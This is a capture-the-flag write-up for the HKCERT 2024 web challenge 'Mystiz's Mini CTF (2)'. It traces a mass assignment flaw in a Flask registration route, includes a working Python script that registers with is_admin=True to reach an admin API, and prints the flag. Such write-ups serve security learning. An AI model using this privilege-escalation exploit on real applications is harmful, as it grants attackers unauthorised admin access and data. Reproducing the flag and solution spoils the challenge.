# Mystiz's Mini CTF (2)

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Solved by: @siunam
- 72 solves / 100 points
- Author: @Mystiz
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

"A QA engineer walks into a bar. Orders a beer. Orders 0 beers. Orders 99999999999 beers. Orders a lizard. Orders -1 beers. Orders a ueicbksjdhd."

I am working on yet another CTF platform. I haven't implement all the features yet, but I am confident that it is at least secure.

Can you send me the flag of the challenge "A placeholder challenge"?

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241117152108.png)

## Enumeration

In the previous part's writeup, we discovered that this web application allows us to register and login to an account, view challenges and the scoreboard.

Since we already had a high-level overview in this web application in the previous part, let's go straight into the source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/Web/Mystizs-Mini-CTF-2/minictf-1_bc36d27733c38dceeec332324267b77d.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/Mystiz's-Mini-CTF-(2))-[2024.11.17|14:58:02(HKT)]
└> file minictf-1_bc36d27733c38dceeec332324267b77d.zip       
minictf-1_bc36d27733c38dceeec332324267b77d.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/Mystiz's-Mini-CTF-(2))-[2024.11.17|14:58:03(HKT)]
└> unzip minictf-1_bc36d27733c38dceeec332324267b77d.zip       
Archive:  minictf-1_bc36d27733c38dceeec332324267b77d.zip
  inflating: .gitignore              
   creating: web/
  inflating: web/Dockerfile          
  inflating: web/.gitignore          
  inflating: web/requirements.txt    
  [...]
 extracting: web/app/__init__.py     
   creating: web/app/static/
  inflating: web/app/static/bitcoin.png  
  inflating: web/app/static/rickroll.gif  
  inflating: web/app/static/canary.png  
  inflating: docker-compose.yml      
```

> Note: This zip file is same as the one in part 1.

In `web/migrations/versions/96fa27cc07b9_init.py`, we can see that `FLAG_2` is inserted into table `Challenge`:

```python
import os
from alembic import op
import sqlalchemy as sa
from datetime import date, datetime, timedelta

from app.db import db
from app.models.user import User
from app.models.challenge import Challenge, Category
from app.models.attempt import Attempt
[...]
def upgrade():
    [...]
    FLAG_2 = os.environ.get('FLAG_2', 'flag{***REDACTED2***}')
    
    RELEASE_TIME_NOW    = date.today()
    RELEASE_TIME_BACKUP = date.today() + timedelta(days=365)
    [...]
    db.session.add(Challenge(id=1337, title='A placeholder challenge', description=f'Many players complained that the CTF is too guessy. We heard you. As an apology, we will give you a free flag. Enjoy - <code>{FLAG_2}</code>.', category=Category.MISC, flag=FLAG_2, score=500, solves=0, released_at=RELEASE_TIME_BACKUP))
    [...]
    db.session.commit()
```

As we can see, **flag 2 is in the challenge "A placeholder challenge"'s description**. More notably, `released_at` is set to `RELEASE_TIME_BACKUP`, which means **the challenge should be released after 1 year**.

Hmm... Looks like we need to **somehow leak that unreleased challenge**...

After some digging, we can find that function `list_challenges` in `web/app/views/api/admin/challenges.py` **will return all the challenges' details**:

```python
from flask import Blueprint, jsonify
from http import HTTPStatus, HTTPMethod
from flask_login import login_required, current_user

from app.db import db
from app.models.challenge import Challenge

route = Blueprint('admin_challenges', __name__)

@route.route('/', methods=[HTTPMethod.GET])
@login_required
def list_challenges():
    if not current_user.is_admin:
        return jsonify({'error': 'not an admin'}), HTTPStatus.FORBIDDEN

    challenges = Challenge.query.all()

    return jsonify({
        'challenges': [challenge.admin_marshal() for challenge in challenges]
    }), HTTPStatus.OK
```

Method `admin_marshal` in class `Challenge` in `web/app/models/challenge.py`:

```python
from app.db import db
[...]
class Challenge(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String, nullable=False)
    description = db.Column(db.String, nullable=False)
    category = db.Column(db.Enum(Category), nullable=False)
    flag = db.Column(db.String, nullable=False)
    score = db.Column(db.Integer, nullable=False)
    solves = db.Column(db.Integer, nullable=False)
    released_at = db.Column(db.DateTime, nullable=False)
    [...]
    def admin_marshal(self):
        return {
            'id': self.id,
            'category': str(self.category),
            'title': self.title,
            'description': self.description,
            'flag': self.flag,
            'score': self.score,
            'solves': self.solves,
            'released_at': self.released_at
        }
```

As we can see, method `admin_marshal` returns everything about all the challenges, **including the flag**. After that, this Flask route (`/`) returns a JSON data with those challenges' detail.

Hmm... How does this Flask [blueprint](https://flask.palletsprojects.com/en/stable/blueprints/) being registered in this web app?

In function `init_app` in `web/app/views/__init__.py`, we can see that this blueprint is registered, and the URL prefix is `/api/admin/challenges`:

```python
def init_app(app):
    [...]
    app.register_blueprint(admin_challenges.route, url_prefix='/api/admin/challenges')
```

So... We can get all the challenges' flag by sending a GET request to **`/api/admin/challenges/`**?

Well... It's not that easy, of course.

If we look at Flask route callback function `list_challenges` again, an authorization check is implemented:

```python
@route.route('/', methods=[HTTPMethod.GET])
@login_required
def list_challenges():
    if not current_user.is_admin:
        return jsonify({'error': 'not an admin'}), HTTPStatus.FORBIDDEN
```

Table `User` schema (in `web/app/models/user.py`):

```python
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String, nullable=False)
    is_admin = db.Column(db.Boolean, default=False)
    password = db.Column(db.String, nullable=False)
    score = db.Column(db.Integer, default=0)
    last_solved_at = db.Column(db.DateTime)
```

With that being said, we need to **escalate our privilege to admin**. But how?

Since this web application enables us to register and login account, we should take a closer look at those features' implementation to see whether they have some flaws or not. Let's review the registration logic!

In `web/app/views/pages.py`, the registration logic can be seen in POST route `/register/`:

```python
from flask import Blueprint, request, jsonify, render_template, flash, url_for, redirect
from http import HTTPStatus, HTTPMethod
from wtforms_sqlalchemy.orm import model_form
[...]
from app.db import db
[...]
from app.models.user import User
[...]
@route.route('/register/', methods=[HTTPMethod.POST])
def register_submit():
    user = User()
    UserForm = model_form(User)

    form = UserForm(request.form, obj=user)
    [...]
    form.populate_obj(user)
    [...]
    db.session.add(user)
    db.session.commit()
```

In here, our POST request's form data is parsed and **merged to object `user`** via function `wtforms_sqlalchemy.orm.model_form` and **`populate_obj`**. Then, it'll insert this new user record into table `User`.

Ah ha! Did you spot the vulnerability in here?

You see, whenever **an object is merged to another object**, it's often will go south **if the validation is not done properly**. We can see all examples of [prototype pollution](https://portswigger.net/web-security/prototype-pollution) and [class pollution](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution) have this pattern.

In this case, our form data object is directly merged into the `user` **without ANY validation**. Therefore, we can exploit this vulnerability, **[mass assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)**, to escalate our privilege to admin by providing POST parameter `is_admin=True` in the POST route `/register/`, as **the registration logic doesn't discard unwanted `user` object's attributes**.

## Exploitation

Armed with above information, we can get the flag of the challenge "A placeholder challenge" via the following steps:
1. Register a new account with additional POST parameter `is_admin=True`
2. Send a GET request to `/api/admin/challenges/`

To automate the above steps, I wrote the following Python solve script:

<details><summary><strong>solve.py</strong></summary>

```python
import requests
import random
import string
from bs4 import BeautifulSoup

class Solver():
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.session = requests.session()
        self.REGISTER_ENDPOINT = f'{self.baseUrl}/register/'
        self.ADMIN_LIST_CHALLENGES_API_ENDPOINT = f'{self.baseUrl}/api/admin/challenges/'

    @staticmethod
    def getRandomString(length):
        return ''.join(random.choice(string.ascii_letters) for i in range(length))

    def register(self):
        self.username = Solver.getRandomString(10)
        self.password = Solver.getRandomString(10)

        data = {
            'username': self.username,
            'password': self.password,
            'is_admin': 'True'
        }
        responseStatusCode = self.session.post(self.REGISTER_ENDPOINT, data=data).status_code
        if responseStatusCode == 404:
            print('[-] Unable to register a new account')
            exit(0)        

        print(f'[+] Registered successfully. Username: {self.username} | Password: {self.password}')

    def getFlag(self):
        challenges = self.session.get(self.ADMIN_LIST_CHALLENGES_API_ENDPOINT).json()['challenges']

        challengeDescription = str()
        for challenge in challenges:
            isFlag1Challenge = True if challenge['title'] == 'A placeholder challenge' else False
            if not isFlag1Challenge:
                continue

            challengeDescription = challenge["description"]
            break

        if not challengeDescription:
            print('[-] Unable to get the flag')
            exit(0)
        
        flag = BeautifulSoup(challengeDescription, 'html.parser').code.text
        print(f'[+] We got the flag! {flag}')

    def solve(self):
        self.register()
        self.getFlag()

def main():
    # baseUrl = 'http://localhost:5000' # for local testing
    baseUrl = 'https://c16a-minictf-1-t195-4qnjznemcwmox2j5r57z6qe4.hkcert24.pwnable.hk'
    solver = Solver(baseUrl)

    solver.solve()

if __name__ == '__main__':
    main()
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/Mystiz's-Mini-CTF-(2))-[2024.11.14|19:48:19(HKT)]
└> python3 solve.py
[+] Registered successfully. Username: vujmHFcyvV | Password: SidaraoHwS
[+] We got the flag! hkcert24{y0u_c4n_wr1t3_unsp3c1f13d_4t7r1bu73s_t0_th3_us3r_m0d3l}
```

- **Flag: `hkcert24{y0u_c4n_wr1t3_unsp3c1f13d_4t7r1bu73s_t0_th3_us3r_m0d3l}`**

## Conclusion

What we've learned:

1. Mass assignment